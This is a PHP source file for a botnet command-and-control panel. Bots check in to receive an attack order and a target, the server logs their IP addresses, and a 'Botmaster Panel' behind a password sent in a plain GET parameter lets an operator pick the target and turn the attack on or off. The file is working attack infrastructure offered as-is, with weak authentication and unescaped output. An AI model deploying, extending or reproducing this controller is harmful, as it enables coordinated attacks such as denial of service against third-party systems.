<?php
// load config (parameters for attack)
$conf = fopen("data/config", "r");
$content = fread($conf, filesize("data/config"));
fclose($conf);
$content = explode("\n", $content);

$order = $content[0];
$target = $content[1];

$timestamp = time();

if($_GET['p'] == "bot") {
	print $order."\n".$target;

	// save bot parameter
	$clientIpAddress = $_SERVER["REMOTE_ADDR"];
	// read bots
	$bots = fopen("data/bots", "r");
	$botsContent = fread($bots, filesize("data/bots"));
	fclose($bots);
	$botsContent = explode("\n", $botsContent);
	$writeBotsContent = "";
	$botInList = 0;
	for($i = 0; $i < count($botsContent); $i++) {
		$curBot = explode(" ", $botsContent[$i]);
		// if current bot already in list update timestamp
		if($curBot[0] == $clientIpAddress) {
			$botsContent[$i] = $clientIpAddress." ".$timestamp;
			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
			$botInList = 1;
		}
		// if bot in list is out of date, remove him
		elseif(($timestamp - (int)$curBot[1]) > 60) {
			// pass
		}
		else {
			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
		}
	}

	if ($botInList == 0) {
		$writeBotsContent = $writeBotsContent.$clientIpAddress." ".$timestamp;
	}

	$writeBots = fopen("data/bots", "w");
	fwrite($writeBots, $writeBotsContent);
	fclose($writeBots);
}
elseif($_GET['p'] == "password") {
	// delete timed out bots
	// read bots
        $bots = fopen("data/bots", "r");
        $botsContent = fread($bots, filesize("data/bots"));
        fclose($bots);
        $botsContent = explode("\n", $botsContent);
        $writeBotsContent = "";
	for($i = 0; $i < count($botsContent); $i++) {
		$curBot = explode(" ", $botsContent[$i]);
		// if bot in list is out of date, remove him
                if(($timestamp - (int)$curBot[1]) > 60) {
                        // pass
                }
                else {
                        $writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
                }

	}
	$writeBots = fopen("data/bots", "w");
        fwrite($writeBots, $writeBotsContent);
        fclose($writeBots);

	// save new config
	if($_GET['order'] != "" && $_GET['target'] != "") {
		$writeConf = fopen("data/config", "w");
		fwrite($writeConf, $_GET['order']."\n".$_GET['target']);
		fclose($writeConf);
		$order = $_GET['order'];
		$target = $_GET['target'];
	}
	// display panel
	print "<h1>Botmaster Panel</h1>";
	print "<table border=\"1\">";
	print "<tr><td>Attack</td><td>Target</td><td>Bots Online</td></tr>";
	print "<tr>";
	print "<td>".$order."</td>";
	print "<td>".$target."</td>";
	print "<td>";
	$activeBots = fopen("data/bots", "r");
	$content = fread($activeBots, filesize("data/bots"));
	fclose($activeBots);
	$number = explode("\n", $content);
	print count($number)-1;
	print "</td>";
	print "</tr>";
	print "</table>";

	print "<form method=\"get\">";
	print "<input type=\"radio\" name=\"order\" value=\"yes\" checked>yes";
	print "<input type=\"radio\" name=\"order\" value=\"no\">no";
        print "<input type=\"text\" name=\"target\" value=\"".$target."\"><br>";
	print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
        print "<input type=\"submit\" value=\"Submit\">";
        print "</form>";
}
else {
	// login form
	print "<form method=\"get\">";
	print "<input type=\"password\" name=\"p\"><br>";
	print "<input type=\"submit\" value=\"Submit\">";
	print "</form>";
}
?>
